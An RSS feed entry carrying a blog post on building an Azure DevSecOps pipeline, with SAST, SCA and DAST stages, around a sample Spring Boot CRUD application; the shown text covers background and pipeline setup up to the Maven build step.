<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>spen440 &#8211; M43L57R0M</title>
	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
	<link>./../../../index.html</link>
	<description>Information Security, Software Engineering</description>
	<lastBuildDate>Sat, 18 Sep 2021 19:18:13 +0000</lastBuildDate>
	<language>en-GB</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	
	<item>
		<title>Shifting Left On A Shoestring: Azure DevSecOps Pipelines</title>
		<link>./../../../shift-left-azure-pipelines/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Tue, 14 Sep 2021 09:03:07 +0000</pubDate>
				<category><![CDATA[Application Security]]></category>
		<category><![CDATA[Azure]]></category>
		<category><![CDATA[CI-CD]]></category>
		<category><![CDATA[Containers]]></category>
		<category><![CDATA[DAST]]></category>
		<category><![CDATA[DevSecOps]]></category>
		<category><![CDATA[Docker]]></category>
		<category><![CDATA[Eclipse]]></category>
		<category><![CDATA[Git]]></category>
		<category><![CDATA[H2 Database]]></category>
		<category><![CDATA[Java]]></category>
		<category><![CDATA[JUnit]]></category>
		<category><![CDATA[Maven]]></category>
		<category><![CDATA[OWASP ZAP]]></category>
		<category><![CDATA[Pipeline]]></category>
		<category><![CDATA[SAST]]></category>
		<category><![CDATA[SCA]]></category>
		<category><![CDATA[ShiftLeft]]></category>
		<category><![CDATA[Snyk]]></category>
		<category><![CDATA[Spring Boot]]></category>
		<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">./../../../index.html?p=504</guid>

					<description><![CDATA[It&#8217;s generally accepted that DevOps is an effective means of delivering higher quality software products at a faster rate, compared to more traditional software development and IT infrastructure management approaches. For some organisations, however, it can be difficult to see a clear, pain-free path out of an environment characterised by waterfall lifecycles and on-premise infrastructure [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>It&#8217;s generally accepted that DevOps is an effective means of delivering higher quality software products at a faster rate, compared to more traditional software development and IT infrastructure management approaches.</p>



<p>For some organisations, however, it can be difficult to see a clear, pain-free path out of an environment characterised by waterfall lifecycles and on-premise infrastructure which once served them well, but which has now become an encumbrance and an impediment to progress.</p>



<span id="more-504"></span>


<h2 class="simpletoc-title">Table of Contents</h2>
<ul class="simpletoc-list">
<li><a href="#background">Background</a>

</li>
<li><a href="#shifting-left">Shifting Left</a>

</li>
<li><a href="#pentesting-no-silver-bullet">Pentesting &#8211; No Silver Bullet</a>

</li>
<li><a href="#objectives">Objectives</a>


<ul><li>
<a href="#viability">Viability</a>

</li>
</ul>
<li><a href="#approach">Approach</a>


<ul><li>
<a href="#azure-devops">Azure DevOps</a>

</li>
<li><a href="#schematic">Schematic</a>

</li>
<li><a href="#pipeline-components">Pipeline Components</a>


<ul><li>
<a href="#development">Development</a>

</li>
<li><a href="#source-code-configuration">Source Code Configuration</a>

</li>
<li><a href="#third-party-components">Third Party Components</a>

</li>
<li><a href="#build-pipeline">Build Pipeline</a>


<ul><li>
<a href="#commit-hook">Commit Hook</a>

</li>
<li><a href="#build-system-maven">Build System (Maven)</a>

</li>
<li><a href="#unit-test">Unit Test</a>

</li>
<li><a href="#containerisation">Containerisation</a>

</li>
<li><a href="#static-application-security-testing-sast">Static Application Security Testing (SAST)</a>

</li>
<li><a href="#software-composition-analysis-sca">Software Composition Analysis (SCA)</a>

</li>
</ul>
<li><a href="#container-registry">Container Registry</a>

</li>
<li><a href="#release-pipeline">Release Pipeline</a>


<ul><li>
<a href="#triggering-a-release">Triggering a release</a>

</li>
<li><a href="#dynamic-application-security-testing-dast">Dynamic Application Security Testing (DAST)</a>

</li>
<li><a href="#deployment">Deployment</a>

</li>
</ul>
</li>
</ul>
</li>
</ul>
<li><a href="#happy-path-testing">Happy Path Testing</a>


<ul><li>
<a href="#unit-test-results">Unit Test Results</a>

</li>
<li><a href="#sast-security-testing-results">SAST Security Testing Results</a>

</li>
<li><a href="#sca-security-testing-results">SCA Security Testing Results</a>

</li>
<li><a href="#dast-security-testing-results">DAST Security Testing Results</a>

</li>
<li><a href="#live-api-testing">Live API Testing</a>

</li>
</ul>
<li><a href="#introducing-an-sql-injection-vulnerability">Introducing an SQL Injection Vulnerability</a>

</li>
<li><a href="#retesting">Re-Testing</a>


<ul><li>
<a href="#updated-live-api-testing-results">Updated &#8211; Live API Testing Results</a>

</li>
<li><a href="#updated-sast-security-testing-results">Updated &#8211; SAST Security Testing Results</a>

</li>
<li><a href="#updated-dast-security-testing-results">Updated &#8211; DAST Security Testing Results</a>

</li>
</ul>
<li><a href="#conclusions">Conclusions</a>
</li></ul>

<h2 class="wp-block-heading" id="background">Background</h2>


<p>The underlying belief may be that the cost and upheaval incurred by a migration to DevOps outweighs any potential benefits to such a degree, that &#8220;carrying on as before&#8221; seems to be better option.</p>



<p>The problem becomes critical, however, when the issue of <a href="https://www.csoonline.com/article/3315700/what-is-application-security-a-process-and-tools-for-securing-software.html"><span class="has-inline-color has-luminous-vivid-amber-color">software application security</span></a> is brought into the mix. Bad actors are becoming increasingly resourceful in finding new ways to read, steal, alter and destroy information of value, and although there are are multitude of ways that an organisations defences can be breached, software application flaws introduced by bad coding practices can increase the risk of an attack leading to a successful security breach.</p>



<p>As a result has become incumbent upon those of us who develop software to adopt practices which help, detect and correct such vulnerabilities before they reach production, and ideally prevent occurring in the first place.</p>


<h2 class="wp-block-heading" id="shifting-left">Shifting Left</h2>


<div class="wp-block-image"><figure class="aligncenter size-full"><a href="./../../../wp-content/uploads/2021/09/jl.png"><img fetchpriority="high" decoding="async" width="476" height="270" src="./../../../wp-content/uploads/2021/09/jl.png" alt="" class="wp-image-525" srcset="./../../../wp-content/uploads/2021/09/jl.png 476w, ./../../../wp-content/uploads/2021/09/jl-300x170.png 300w, ./../../../wp-content/uploads/2021/09/jl-210x119.png 210w" sizes="(max-width: 476px) 100vw, 476px" /></a></figure></div>



<p>The danger is that security testing is viewed as a bolt-on after-thought, conducted outside of the main development process by staff with limited understanding of the software development process itself. Under these circumstances its easy to see how security and development teams might end up working antagonistically &#8211; not only failing to effectively manage security risk, but potentially even slowing down the delivery of story point functionality, reducing overall product quality and increasing costs.</p>



<p>The evolution of DevOps into its security-conscious descendent <a href="https://www.devsecops.org/"><span class="has-inline-color has-luminous-vivid-amber-color">DevSecOps</span></a> is an attempt to combat this. The result is in an approach which allows security requirements to be afforded the same level of importance as functional and other non-functional requirements (eg scalability, safety, portability, etc) by ensuring that security testing is firmly embedded as integral part of the CI/CD pipeline.</p>



<p>The UK Government&#8217;s <span class="has-inline-color has-white-color">National Cyber Security Centre</span><span class="has-inline-color has-luminous-vivid-amber-color"> <a href="https://www.ncsc.gov.uk/">(</a></span><a href="https://www.ncsc.gov.uk/"><span class="has-inline-color has-luminous-vivid-amber-color">NCSC</span></a><span class="has-inline-color has-luminous-vivid-amber-color"><a href="https://www.ncsc.gov.uk/">)</a></span> advocates a <a href="https://www.ncsc.gov.uk/collection/developers-collection/principles/secure-development-is-everyones-concern"><span class="has-inline-color has-luminous-vivid-amber-color">security focused approach</span> </a>to software development which aligns with the principles promoted by DevSecOps. This support is echoed in the whitepaper &#8220;<a href="https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf"><span class="has-inline-color has-luminous-vivid-amber-color">Mitigating the Risk of Software Vulnerabilities by Adopting a Secure Software Development Framework (SSDF)</span></a>&#8221; published by the <span class="has-inline-color has-white-color">US National Institute of Standards and Technology</span> (<a href="https://www.nist.gov/"><span class="has-inline-color has-luminous-vivid-amber-color">NIST</span></a>), identifies a number of key DevSecOps practices which organisations are advised to adopt to ensure security is embedded early in entire development lifecycle:</p>



<blockquote class="wp-block-quote has-text-align-left is-layout-flow wp-block-quote-is-layout-flow"><p>&#8211; Ensure that <span class="has-inline-color has-vivid-red-color">security requirements</span> for software development are known at all times so that they can be taken into account <span class="has-inline-color has-vivid-red-color">throughout the SDLC</span>.</p><p>&#8211; Identify and evaluate the applicable security requirements for the software’s design; determine what security risks the software is likely to face during production operation and <span class="has-inline-color has-vivid-red-color">how those risks should be mitigated by the software’s design</span>.</p><p>&#8211; Ensure that the software resulting from the SDLC meets the organization’s expectations by defining criteria for <span class="has-inline-color has-vivid-red-color">checking the software’s security during development</span>.</p></blockquote>


<h2 class="wp-block-heading" id="pentesting-no-silver-bullet">Pentesting &#8211; No Silver Bullet</h2>


<p>It&#8217;s not an uncommon approach for organisations who have yet to embrace CI/CD to commission a penetration test when development of a system is complete (sometimes even after it is been deployed to production). Although post-development penetration testing is probably better than no security testing at all, there are a number of reasons why this approach might be considered flawed:</p>



<ul class="wp-block-list"><li>Because penetration tests are typically conducted just before (or sometimes after) the system goes into production, the cost of fixing any issues found is likely to be considerably higher compared to fixing them earlier in the development cycle.</li><li>Test results represent a single snapshot of the system&#8217;s security status in time &#8211; a vulnerability introduced the day after the test is conducted could be entrenched for months before the next planned test.</li><li>Tests are often conducted by security consultants more familiar with IT infrastructure than software development, making the process of translating test findings into actionable remediation advice for developers problematic.</li><li>Tests can easily be mis-scoped if the development team doesn&#8217;t have a clear idea of what information they need from the test. It&#8217;s all too easy to end up with a test report which enumerates all the security misconfigurations within the host system&#8217;s infrastructure, but reveals very little about the types of vulnerabilities found through application security testing, such as broken authentication mechanisms, command or query injection, or unsafe object deserialisation.</li></ul>



<p>Rather than discounting the value of penetration testing however, perhaps it makes sense to consider repurposing it, to serve more as a means of verifying the efficacy of a development process which actively seeks to &#8220;<a href="https://www.devsecops.org/blog/2016/5/20/-security"><span class="has-inline-color has-luminous-vivid-amber-color">shift security left</span></a>&#8220;.</p>



<p class="has-text-align-left">To be truly effective however, this may mean a shift to a more black-box focused testing approach. Pen pen testers with access to development artefacts such source code, design documents, architecture analysis results, misuse and abuse cases, code review results and deployment configurations, coupled with an &#8220;attacker mindset&#8221; are more likely to identify the obscure edge case vulnerabilities that persistent, stealthy threat actors are becoming increasingly adept at finding and exploiting. </p>



<hr class="wp-block-separator"/>


<h2 class="wp-block-heading" id="objectives">Objectives</h2>


<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><a href="./../../../wp-content/uploads/2021/09/cloudpipel-1.png"><img decoding="async" src="./../../../wp-content/uploads/2021/09/cloudpipel-1-1024x565.png" alt="" class="wp-image-530" width="512" height="283" srcset="./../../../wp-content/uploads/2021/09/cloudpipel-1-1024x565.png 1024w, ./../../../wp-content/uploads/2021/09/cloudpipel-1-300x165.png 300w, ./../../../wp-content/uploads/2021/09/cloudpipel-1-768x424.png 768w, ./../../../wp-content/uploads/2021/09/cloudpipel-1-210x116.png 210w, ./../../../wp-content/uploads/2021/09/cloudpipel-1.png 1106w" sizes="(max-width: 512px) 100vw, 512px" /></a></figure></div>



<p>The objective of the exercise detailed in this post then, is to attempt to answer the question: <span class="has-inline-color has-white-color"><em>How easy is it to stand up a proof of concept demonstrator, to help interested but hesitant stake holders understand why and how adopting a cloud native, continuous integration/continuous delivery DevSecOps pipeline is a viable approach to reducing risk</em></span><em><span class="has-inline-color has-vivid-red-color">*</span></em><span class="has-inline-color has-white-color"><em> and improving quality, without negatively impacting speed of delivery ?</em></span></p>



<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
<p><span class="has-inline-color has-vivid-red-color">*</span><em>How do we define risk ?</em></p>



<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">
<ul class="wp-block-list"><li><em>IT organisations deal with&nbsp;<span class="has-inline-color has-white-color">information&nbsp;</span>– i.e. facts and figures which have meaning in a specific context.</em></li><li><em><span class="has-inline-color has-white-color">Information</span>&nbsp;within an organisation is typically viewed as a collection of&nbsp;<span class="has-inline-color has-white-color">assets</span>, where each asset has a&nbsp;<span class="has-inline-color has-white-color">value&nbsp;</span>which reflects its importance to the organisation.</em></li><li><em>This&nbsp;<span class="has-inline-color has-white-color">value&nbsp;</span>can be derived from many factors, but is generally proportional to the seriousness of sustaining a degradation to one of three properties used to express the security state an information asset, namely:&nbsp;<span class="has-inline-color has-white-color">Confidentiality,&nbsp;Integrity&nbsp;and&nbsp;Availability</span>&nbsp;(or “<a href="https://www.iso.org/obp/ui/#iso:std:iso-iec:27000:ed-5:v1:en:term:3.28"><span class="has-inline-color has-luminous-vivid-amber-color">CIA</span></a>“).</em></li><li><em>These properties can be degraded through a variety of possible scenarios involving potential <span class="has-inline-color has-white-color">threats</span>, each of which needs to be assessed to estimate the <span class="has-inline-color has-white-color">likelihood </span>of it occurring, via a processes such <a href="https://www.devseccon.com/threat-modeling-in-2021/"><span class="has-inline-color has-luminous-vivid-amber-color">threat modelling</span></a>.</em></li><li><em>Information systems can contain flaws, or&nbsp;<span class="has-inline-color has-white-color">vulnerabilities</span>, which can adversely affect the&nbsp;<span class="has-inline-color has-white-color">CIA&nbsp;</span>of the information&nbsp;assets&nbsp;it manipulates.</em></li><li><em>The severity of <span class="has-inline-color has-white-color">risk </span>is assessed by considering how <span class="has-inline-color has-white-color">likely </span>it is that a <span class="has-inline-color has-white-color">threat </span>will <span class="has-inline-color has-white-color">exploit </span>a <span class="has-inline-color has-white-color">vulnerability </span>and what the <span class="has-inline-color has-white-color">impact </span>could be given the <span class="has-inline-color has-white-color">value </span>of affected information <span class="has-inline-color has-white-color">asset</span>.</em></li><li><em>Vulnerabilities&nbsp;present in software systems expose the organisation to&nbsp;risk&nbsp;through a variety of impact types, including:</em><ul><li><em><span class="has-inline-color has-white-color">Financial loss</span></em></li><li><em><span class="has-inline-color has-white-color">Operational capacity reduction</span></em></li><li><em><span class="has-inline-color has-white-color">Legal or regulatory penalties</span></em></li><li><em><span class="has-inline-color has-white-color">Reputational damage</span></em></li><li><em><span class="has-inline-color has-white-color">Harm or damage to persons and property.</span></em></li></ul></li></ul>



<p><em>For more information on the relationship between software vulnerabilities and business risk, please have a read of my post: &#8220;<a href="./../../../insecure-deserialisation/index.html"><span class="has-inline-color has-luminous-vivid-amber-color">Software Vulnerabilities and Business Risk</span></a>&#8221; which outlines the concept with a case study using Java insecure deserialisation as an example.</em></p>
</div></div>
</div></div>


<h3 class="wp-block-heading" id="viability">Viability</h3>


<p>Approaching this from the point of view of stakeholders, and queries and concerns that might be expressed when considering a shift to a DevSecOps approach:</p>



<p><strong><span class="has-inline-color has-white-color">Bottleneck</span></strong>: will it slow the development process process down ?<br><strong><span class="has-inline-color has-white-color">Feedback</span></strong>: will it allow developers to find out about security issues soon after they&#8217;ve been introduced, when remediation is comparatively easier and cheaper ?<br><strong><span class="has-inline-color has-white-color">Constructive</span>:</strong> will it provide information that can be understood by a development audience so it can be acted upon ?<br><strong><span class="has-inline-color has-white-color">Overhead</span></strong>: how much additional workload will it cause for the development team ?<br><strong><span class="has-inline-color has-white-color">Scalable</span></strong>: how easy is to change, adapt, grow / shrink ?<br><strong><span class="has-inline-color has-white-color">Experimentation</span></strong>: learning leads to innovation: developers are problem solvers &#8211; does it give developers the freedom try out different ways to fix security bugs, quickly, in an isolated environment without fear of breaking the release process, learning from mistakes without fear of retribution ?<br><strong><span class="has-inline-color has-white-color">Costs</span></strong>: What are the initial costs ? What does the ongoing spend profile looks like &#8211; is it easy to quantify and predict ?<br><strong><span class="has-inline-color has-white-color">Metrics</span></strong>: how easy is it to assess and report on the level of business risk exposure from the results generated from security testing in the pipeline ?<br><strong><span class="has-inline-color has-white-color">ROI</span></strong>: How can the organisation&#8217;s return on investment be measured using the results generated ?</p>



<hr class="wp-block-separator"/>


<h2 class="wp-block-heading" id="approach">Approach</h2>

<h3 class="wp-block-heading" id="azure-devops">Azure DevOps</h3>


<p><strong><em>Note:</em></strong> <em>The decision to use <a href="https://azure.microsoft.com/en-gb/"><span class="has-inline-color has-luminous-vivid-amber-color">Microsoft Azure</span></a> as the cloud platform for this exercise is purely arbitrary. There is no intention to present an evaluation of/comparison between the services offered by each of the various cloud providers. The assumption is that it would be relatively straightforward to port this architecture to <a href="https://aws.amazon.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Amazon Web Services</span></a>, <a href="https://cloud.google.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Google Cloud Platform</span></a> or some other provider.</em></p>


<h3 class="wp-block-heading" id="schematic">Schematic</h3>


<p>The following image provides a pictorial overview of the overall process, and illustrates the separation between the build and release pipelines. In a production environment, it&#8217;s likely that there would be multiple development, test and live deployments but to keep things simple we have just a single live deployment here. </p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6.png"><img decoding="async" width="1024" height="724" src="./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6-1024x724.png" alt="" class="wp-image-546" srcset="./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6-1024x724.png 1024w, ./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6-300x212.png 300w, ./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6-768x543.png 768w, ./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6-210x148.png 210w, ./../../../wp-content/uploads/2021/09/VW-PIPEL-001-6.png 1123w" sizes="(max-width: 980px) 100vw, 980px" /></a></figure></div>



<p>The <a href="https://azure.microsoft.com/en-us/services/devops/"><span class="has-inline-color has-luminous-vivid-amber-color">Azure DevOps</span></a> web interface provides a dashboard which makes it easy to switch between views of the build and release pipelines, code repositories and build artefacts. There&#8217;s also support for Scrum style development in the form of sprint issue boards, backlogs, burndown and velocity charts, etc.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-001-768x479.jpg" alt="" class="wp-image-593" width="576" height="359" srcset="./../../../wp-content/uploads/2021/09/az-pl-001-768x479.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-001-300x187.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-001-1024x639.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-001-210x131.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-001.jpg 1082w" sizes="(max-width: 576px) 100vw, 576px" /></a></figure></div>



<p>Each stage of the pipeline is outlined below.</p>


<h3 class="wp-block-heading" id="pipeline-components">Pipeline Components</h3>

<h4 class="wp-block-heading" id="development">Development</h4>


<p>I put together a simple Java <a href="https://spring.io/guides/gs/spring-boot/"><span class="has-inline-color has-luminous-vivid-amber-color">Spring Boot MVC</span></a> web application to serve as the target for this exercise. It contains a single &#8220;<code><em>User</em></code>&#8221; data entity type  stored in an in-memory <a href="https://www.h2database.com/html/main.html"><span class="has-inline-color has-luminous-vivid-amber-color">H2 database</span></a> and provides create, read, update and delete (CRUD) functionality via an HTTP JSON API.</p>



<p>The project includes a suite of <a href="https://junit.org/junit5/"><span class="has-inline-color has-luminous-vivid-amber-color">JUnit</span></a> tests, is built using the <a href="https://maven.apache.org/"><span class="has-inline-color has-luminous-vivid-amber-color">Apache Maven</span></a> build system, and is packaged into a <a href="https://www.docker.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Docker</span></a> image for ease of deployment.</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-001.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-001-768x505.png" alt="" class="wp-image-565" width="576" height="379" srcset="./../../../wp-content/uploads/2021/09/vulnweb-001-768x505.png 768w, ./../../../wp-content/uploads/2021/09/vulnweb-001-300x197.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-001-1024x674.png 1024w, ./../../../wp-content/uploads/2021/09/vulnweb-001-210x138.png 210w, ./../../../wp-content/uploads/2021/09/vulnweb-001.png 1214w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Apache Maven is used to build the application and manage dependencies</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-009.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-009-768x449.png" alt="" class="wp-image-561" width="576" height="337" srcset="./../../../wp-content/uploads/2021/09/vulnweb-009-768x449.png 768w, ./../../../wp-content/uploads/2021/09/vulnweb-009-300x175.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-009-210x123.png 210w, ./../../../wp-content/uploads/2021/09/vulnweb-009.png 998w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>For simplicity, the application contains just a single entity type</em></figcaption></figure></div>



<p>To keep things simple, the database is created at start up and populated with a initial set of test data:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-003.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-003-768x358.png" alt="" class="wp-image-555" width="576" height="269" srcset="./../../../wp-content/uploads/2021/09/vulnweb-003-768x358.png 768w, ./../../../wp-content/uploads/2021/09/vulnweb-003-300x140.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-003-210x98.png 210w, ./../../../wp-content/uploads/2021/09/vulnweb-003.png 890w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Initial dataset</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-002.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-002.png" alt="" class="wp-image-554" width="557" height="303" srcset="./../../../wp-content/uploads/2021/09/vulnweb-002.png 742w, ./../../../wp-content/uploads/2021/09/vulnweb-002-300x163.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-002-210x114.png 210w" sizes="(max-width: 557px) 100vw, 557px" /></a><figcaption><em>An H2 database is created at start up</em></figcaption></figure></div>



<p>The Controller class maps API endpoints to the CRUD methods using standard Spring decorators:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-013.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-013-768x661.png" alt="" class="wp-image-618" width="576" height="496" srcset="./../../../wp-content/uploads/2021/09/vulnweb-013-768x661.png 768w, ./../../../wp-content/uploads/2021/09/vulnweb-013-300x258.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-013-210x181.png 210w, ./../../../wp-content/uploads/2021/09/vulnweb-013.png 889w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Spring MVC maps API endpoint mappings</em></figcaption></figure></div>



<p>With the application running locally, the API can tested via a web browser:</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-016.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-016.png" alt="" class="wp-image-627" width="485" height="167" srcset="./../../../wp-content/uploads/2021/09/vulnweb-016.png 647w, ./../../../wp-content/uploads/2021/09/vulnweb-016-300x103.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-016-210x72.png 210w" sizes="(max-width: 485px) 100vw, 485px" /></a><figcaption><em>Local API testing &#8211; query by ID</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/vulnweb-015.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/vulnweb-015.png" alt="" class="wp-image-628" width="482" height="174" srcset="./../../../wp-content/uploads/2021/09/vulnweb-015.png 642w, ./../../../wp-content/uploads/2021/09/vulnweb-015-300x108.png 300w, ./../../../wp-content/uploads/2021/09/vulnweb-015-210x76.png 210w" sizes="(max-width: 482px) 100vw, 482px" /></a><figcaption><em> Local API testing &#8211; query by username</em></figcaption></figure></div>


<h4 class="wp-block-heading" id="source-code-configuration">Source Code Configuration</h4>


<p>The project is configured in a <a href="https://git-scm.com/"><span class="has-inline-color has-luminous-vivid-amber-color">Git</span></a> repository, with the remote located on <a href="https://github.com/"><span class="has-inline-color has-luminous-vivid-amber-color">GitHub</span></a>:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-repo-002.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-repo-002-768x345.jpg" alt="" class="wp-image-591" width="576" height="259" srcset="./../../../wp-content/uploads/2021/09/az-pl-repo-002-768x345.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-repo-002-300x135.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-repo-002-1024x460.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-repo-002-210x94.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-repo-002.jpg 1408w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>GitHub repo</em></figcaption></figure></div>



<p>To import the source code into the Azure environment, I forked the GitHub repository to an Azure Git Repo:</p>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-repo-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-repo-001-768x341.jpg" alt="" class="wp-image-592" width="576" height="256" srcset="./../../../wp-content/uploads/2021/09/az-pl-repo-001-768x341.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-repo-001-300x133.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-repo-001-1024x454.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-repo-001-210x93.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-repo-001.jpg 1301w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Azure Git Repo</em></figcaption></figure></div>


<h4 class="wp-block-heading" id="third-party-components">Third Party Components</h4>


<p>When the application docker image is built, a number of required dependencies are incorporated, including <a href="https://openjdk.java.net/"><span class="has-inline-color has-luminous-vivid-amber-color">Java OpenJDK</span></a>, and several libraries to support secure network communications, certificate management, source code management, file compression, etc on the target operating system.</p>



<p>The Maven build process parses the application&#8217;s Project Object Model (<a href="https://maven.apache.org/guides/introduction/introduction-to-the-pom.html"><span class="has-inline-color has-luminous-vivid-amber-color">POM</span></a>) file which defines the dependencies needed to build the application as a docker container.</p>


<h4 class="wp-block-heading" id="build-pipeline">Build Pipeline</h4>


<p>The Azure build pipeline is defined using a <a href="https://yaml.org/"><span class="has-inline-color has-luminous-vivid-amber-color">YAML</span></a> configuration file, which is configured in the project source code repository along with source for the project itself. The YAML file contains a sequence of jobs and tasks, defining the actions which are performed at each stage of the pipeline.</p>



<p>Azure DevOps provides support for generating the YAML file visually or manually &#8211; to try out both, I used the manual method for the build pipeline and the visual method for the release pipeline:</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-yaml-main-1.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-yaml-main-1.jpg" alt="" class="wp-image-604" width="528" height="303" srcset="./../../../wp-content/uploads/2021/09/az-pl-yaml-main-1.jpg 704w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-main-1-300x172.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-yaml-main-1-210x121.jpg 210w" sizes="(max-width: 528px) 100vw, 528px" /></a><figcaption><em>Build pipeline YAML fragment &#8211; global variables</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="commit-hook">Commit Hook</h5>


<p>The Build Pipeline is automatically triggered when a change to a configured source file is pushed to the Git Repo:</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pipl-commithook.png"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pipl-commithook.png" alt="" class="wp-image-644" width="572" height="410" srcset="./../../../wp-content/uploads/2021/09/az-pipl-commithook.png 763w, ./../../../wp-content/uploads/2021/09/az-pipl-commithook-300x215.png 300w, ./../../../wp-content/uploads/2021/09/az-pipl-commithook-210x150.png 210w" sizes="(max-width: 572px) 100vw, 572px" /></a><figcaption><em>Build run details included the hash of the commit which triggered it</em></figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-medium_large is-resized"><a href="./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001.jpg"><img loading="lazy" decoding="async" src="./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001-768x356.jpg" alt="" class="wp-image-586" width="576" height="267" srcset="./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001-768x356.jpg 768w, ./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001-300x139.jpg 300w, ./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001-1024x475.jpg 1024w, ./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001-210x97.jpg 210w, ./../../../wp-content/uploads/2021/09/az-pl-build-inprog-001.jpg 1351w" sizes="(max-width: 576px) 100vw, 576px" /></a><figcaption><em>Build pipeline mid execution</em></figcaption></figure></div>


<h5 class="wp-block-heading" id="build-system-maven">Build System (Maven)</h5>


<p>The project utilises Apache Maven to manage the application&#8217;s build process and its dependencies. The POM file lists the applications dependencies &#8211; this is executed by a dedicated task in the Azure Build pipeline:</p>



